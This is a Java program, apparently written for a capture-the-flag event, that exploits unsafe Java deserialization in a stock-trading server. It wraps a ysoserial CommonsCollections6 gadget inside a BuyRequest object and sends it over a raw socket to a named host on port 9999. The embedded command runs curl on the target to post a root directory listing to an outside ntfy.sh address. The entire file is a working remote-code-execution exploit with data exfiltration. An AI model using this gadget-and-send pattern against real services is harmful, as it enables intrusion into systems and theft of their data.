import com.ctf.stockapp.common.protocol.BuyRequest;
import ysoserial.payloads.util.PayloadRunner;

import java.io.ObjectOutputStream;
import java.net.Socket;

public class BuildAndSendPayload {
    public static void main(String[] args) throws Exception {
        String targetHost = "team54-thickapp.durhack.qwerty.technology";
        int targetPort = 9999;

        String payloadName = "CommonsCollections6";
        String cmd = "curl -d '$(ls /)' ntfy.sh/sglre6355";

        // Use ysoserial's Payload classes to get the gadget object
        // Option A: use the PayloadRunner helper (if present) to get bytes -> we avoid local deserialization
        // Option B: instantiate payload object via Reflection on the payload class
        // Below uses PayloadRunner to produce bytes, then deserializes them into an object *in this JVM* - DANGEROUS,
        // so only run in sandbox. Prefer directly invoking payload class getObject if available.

        Object gadget = ysoserial.payloads.ObjectPayload.Utils.getPayloadObject(payloadName, cmd);
        // If above utility isn't present in your ysoserial build, instantiate payload via reflection:
        // Class<?> pclass = Class.forName("ysoserial.payloads." + payloadName);
        // Object payloadInstance = pclass.getDeclaredConstructor().newInstance();
        // Method getObject = pclass.getMethod("getObject", String.class);
        // Object gadget = getObject.invoke(payloadInstance, cmd);

        // Now embed gadget into BuyRequest.data
        BuyRequest br = new BuyRequest("AMZN", 1);
        br.setData(gadget);

        try (Socket s = new Socket(targetHost, targetPort);
            ObjectOutputStream oos = new ObjectOutputStream(s.getOutputStream())) {
            oos.writeObject(br);
            oos.flush();
            // Optionally read response...
        }

        System.out.println("BuyRequest with gadget sent.");
    }
}

